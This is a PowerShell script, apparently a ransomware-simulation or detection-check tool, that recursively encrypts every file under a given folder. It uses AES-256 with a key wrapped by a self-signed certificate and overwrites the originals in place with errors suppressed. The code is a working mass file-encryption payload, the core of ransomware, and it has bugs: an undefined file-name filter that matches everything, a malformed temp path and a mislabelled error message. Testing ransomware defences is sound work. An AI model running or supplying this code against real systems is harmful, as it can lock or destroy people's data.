#Requires -Version 5

param (
    [Parameter(Mandatory=$true)]
    [string]$folderPath,
    [Parameter(Mandatory=$false)]
    [string]$certDnsName
)

Function Encrypt-File {
    Param(
        [Parameter(mandatory = $true)]
            [System.IO.FileInfo] $FilesToEncrypt,
        [Parameter(mandatory = $true)]
            [System.Security.Cryptography.X509Certificates.X509Certificate2] $Cert
    )
 
    #Load the assembly to encrypt
    Try { 
        [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Cryptography") 
    }
    Catch { 
        Write-Error "Could not load required assembly. \n $($_.Message)"
        Return 
    }  

    $AesProvider = New-Object System.Security.Cryptography.AesManaged
    $AesProvider.KeySize = 256
    $AesProvider.BlockSize = 128
    $AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC


    $KeyFormatter = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Cert.PublicKey.Key)
    [Byte[]]$KeyEncrypted = $KeyFormatter.CreateKeyExchange($AesProvider.Key, $AesProvider.GetType())
    [Byte[]]$LenKey = $Null
    [Byte[]]$LenIV = $Null
    [Int]$LKey = $KeyEncrypted.Length
    $LenKey = [System.BitConverter]::GetBytes($LKey)
    [Int]$LIV = $AesProvider.IV.Length
    $LenIV = [System.BitConverter]::GetBytes($LIV)

    $FileStreamWriter = $null
    
    Try { 
        $FileStreamWriter = New-Object System.IO.FileStream("$($env:temp+$FilesToEncrypt.Name)", [System.IO.FileMode]::Create) 
    }
    Catch { 
        Write-Error "Unable to open output file for writing.  \n $($_.Message)"
        Return
    }

    $FileStreamWriter.Write($LenKey, 0, 4)
    $FileStreamWriter.Write($LenIV, 0, 4)
    $FileStreamWriter.Write($KeyEncrypted, 0, $LKey)
    $FileStreamWriter.Write($AesProvider.IV, 0, $LIV)

    $Transform = $AesProvider.CreateEncryptor()
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [Int]$Count = 0
    [Int]$Offset = 0
    [Int]$BlockSizeBytes = $AesProvider.BlockSize / 8
    [Byte[]]$Data = New-Object Byte[] $BlockSizeBytes
    [Int]$BytesRead = 0
    Try { 
        $FileStreamReader = New-Object System.IO.FileStream("$($FilesToEncrypt.FullName)", [System.IO.FileMode]::Open) 
    }
    Catch { 
        Write-Error "Unable to open input file for reading.  \n $($_.Message)"
        Return 
    }
    
    Do {
        $Count = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
        $Offset += $Count
        $CryptoStream.Write($Data, 0, $Count)
        $BytesRead += $BlockSizeBytes
    } While ($Count -gt 0)
     
    $CryptoStream.FlushFinalBlock()
    $CryptoStream.Close()
    $FileStreamReader.Close()
    $FileStreamWriter.Close()

    Copy-Item -Path $($env:temp + $FilesToEncrypt.Name) -Destination $FilesToEncrypt.FullName -Force
}

if(-not($certDnsName)){
    $certDnsName = 'ransomware.check.internal'
}
$cert = $(Get-ChildItem Cert:\localmachine\My | Where-Object {$_.DnsNameList -eq $certDnsName})
if(-not($cert)){
    try{
        #PS 5 need to use Provider because the default provider do not generate a PK
        $cert = New-SelfSignedCertificate -CertStoreLocation cert:\localmachine\my -DnsName $certDnsName -Provider 'Microsoft Enhanced RSA and AES Cryptographic Provider'
    }
    catch{
        Write-Error "Failed to create a certificate \n $($_.Message)" 
        Exit
    }
}
try {
    $FilesToEncrypt = Get-ChildItem -recurse -Force -Path $folderPath | Where-Object { !($_.PSIsContainer -eq $true) -and  ( $_.Name -like "*$fileName*") }    
}
catch {
    Write-Error "Failed to create a certificate \n $($_.Message)" 
    Exit
}
$totalFiles = $FilesToEncrypt.Count
$i = 1
foreach ($f in $FilesToEncrypt){
    Write-Progress -Activity "Encrypt files" -Status " Encrypt file $($f.Name) with certificate $certDnsName" -PercentComplete ($i++ / $totalFiles * 100)
    Encrypt-File $f.FullName $cert -ErrorAction SilentlyContinue  
}